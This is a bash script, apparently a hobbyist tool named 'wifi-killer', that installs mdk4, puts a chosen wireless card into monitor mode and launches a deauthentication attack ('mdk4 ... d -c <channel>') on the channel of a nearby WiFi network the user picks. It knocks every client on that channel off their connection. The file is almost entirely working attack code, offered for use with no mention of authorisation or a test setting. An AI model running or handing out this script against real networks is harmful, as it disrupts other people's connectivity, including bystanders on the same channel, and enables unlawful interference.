#!/bin/bash
if [ "$(id -u)" -ne 0 ]; then
	echo "This script must be run as root"
	exit 1
fi                                                                                 

# Function to check if a package is installed
check_package() {
    dpkg -l | grep -q $1
}

# Check if mdk4 is installed
if ! check_package mdk4; then
    echo "mdk4 is not installed."
    echo "would you like to install it? (y/n)"
    read choice 
    if [ "$choice" != "y" ]; then  
        echo "script cant run without mdk4"
        exit 1
    fi
    sudo apt update
    sudo apt install -y mdk4
    echo "mdk4 has been installed."
else
    echo "mdk4 is already installed."
fi

clear
echo "                  ███     ██████   ███             █████       ███  ████  ████                    "
echo "                 ░░░     ███░░███ ░░░             ░░███       ░░░  ░░███ ░░███                    "
echo " █████ ███ █████ ████   ░███ ░░░  ████             ░███ █████ ████  ░███  ░███   ██████  ████████ "
echo "░░███ ░███░░███ ░░███  ███████   ░░███  ██████████ ░███░░███ ░░███  ░███  ░███  ███░░███░░███░░███"
echo " ░███ ░███ ░███  ░███ ░░░███░     ░███ ░░░░░░░░░░  ░██████░   ░███  ░███  ░███ ░███████  ░███ ░░░ "
echo " ░░███████████   ░███   ░███      ░███             ░███░░███  ░███  ░███  ░███ ░███░░░   ░███     "
echo "  ░░████░████    █████  █████     █████            ████ █████ █████ █████ █████░░██████  █████    "
echo "   ░░░░ ░░░░    ░░░░░  ░░░░░     ░░░░░            ░░░░ ░░░░░ ░░░░░ ░░░░░ ░░░░░  ░░░░░░  ░░░░░     "
                                                                                                  
                                                                                                  
                                                                                                  
echo "made by MrScratchcat using mdk4"
echo ""
echo "Please pick a WiFi Card that supports monitor mode:"


# Use the 'iwconfig' command to list wireless interfaces
wifi_cards=($(iwconfig 2>/dev/null | grep -o '^[a-zA-Z0-9]*'))

# Display the available WiFi cards with numbers
for ((i=0; i<${#wifi_cards[@]}; i++)); do
    echo "$((i+1)). ${wifi_cards[i]}"
done

echo "Enter the number of the WiFi card you want to use:"
read selection

# Validate the selection
if [[ $selection -ge 1 && $selection -le ${#wifi_cards[@]} ]]; then
    selected_wifi_card="${wifi_cards[selection-1]}"
    echo "You selected: $selected_wifi_card"
else
    echo "Invalid selection. Please enter a valid number."
fi

# Check if NetworkManager is running
if ! systemctl is-active --quiet NetworkManager; then
    # Start NetworkManager if it's not running
    echo "NetworkManager is not running starting now..."
    sleep 1
    sudo systemctl start NetworkManager
    echo "NetworkManager has been started."
else
    echo "NetworkManager is already running."
fi

sleep 1

if sudo iwconfig $selected_wifi_card mode managed 2>/dev/null; then
    echo "Wireless interface $selected_wifi_card set to managed mode."
else
    echo "Error setting wireless interface to managed mode."
    sleep 1
fi
clear
# List available WiFi network names (SSIDs) with corresponding numbers
echo "Please wait for available WiFi Networks:"
wifi_list=$(nmcli -f SSID dev wifi list | tail -n +2 | awk '$1 != "--" {print $1}')
num=1
for network in $wifi_list; do
    echo "$num. $network"
    num=$((num + 1))
done

# Prompt the user to select a network by number
read -p "Enter the number of the WiFi network you want to check: " selected_num

# Validate the selected number
if ! [[ "$selected_num" =~ ^[0-9]+$ ]]; then
    echo "Invalid input. Please enter a valid number."
    exit 1
fi

# Check if the selected number is within a valid range
if [ "$selected_num" -ge 1 ] && [ "$selected_num" -le "$num" ]; then
    selected_network=$(echo "$wifi_list" | awk -v num="$selected_num" 'NR == num')
    echo "Selected WiFi network: $selected_network"
else
    echo "Invalid selection. Please choose a valid number."
    exit 1
fi

# Get the channel number for the selected network
channel=$(nmcli -f SSID,CHAN dev wifi list | grep -w "$selected_network" | awk '{print $2}' | head -n 1)
clear

# List available Wi-Fi networks on the selected channel
echo "Please wait for available Wi-Fi networks on channel $channel:"
nmcli -f SSID,CHAN dev wifi list | tail -n +2 | awk -v channel="$channel" '$2 == channel {print $1}'

ssid_list=$(nmcli -f SSID,CHAN dev wifi list | tail -n +2 | awk -v channel="$channel" '$2 == channel {print $1}')

if [ $(echo "$ssid_list" | wc -l) -gt 1 ]; then
  read -p "There are multiple Wi-Fi networks on channel $channel. Do you want to continue? (y/n) " choice
  if [ "$choice" != "y" ]; then
    exit 1
  fi
fi

for ssid in $ssid_list; do
  nmcli dev wifi disconnect
  nmcli dev wifi connect "$ssid"
done

# Set the wireless interface to monitor mode
if sudo iwconfig $selected_wifi_card mode monitor 2>/dev/null; then
    echo "Wireless interface $selected_wifi_card set to monitor mode."
else
    echo "Error setting wireless interface to monitor mode. Running airmon-ng check kill..."
    sudo airmon-ng check kill
    echo "Attempting to set monitor mode again..."
    if sudo iwconfig $selected_wifi_card mode monitor 2>/dev/null; then
        echo "Wireless interface $selected_wifi_card set to monitor mode."
    else
        echo "Error: Unable to set wireless interface to monitor mode even after running airmon-ng check kill."
        exit
    fi
fi
sleep 1
clear
# Check if the network was found and display the channel if available
if [ -n "$channel" ]; then

    sudo mdk4 $selected_wifi_card d -c $channel

else
    echo "Network '$selected_network' not found or unable to retrieve channel information."
fi
sudo iwconfig $selected_wifi_card mode managed
sudo systemctl start NetworkManager
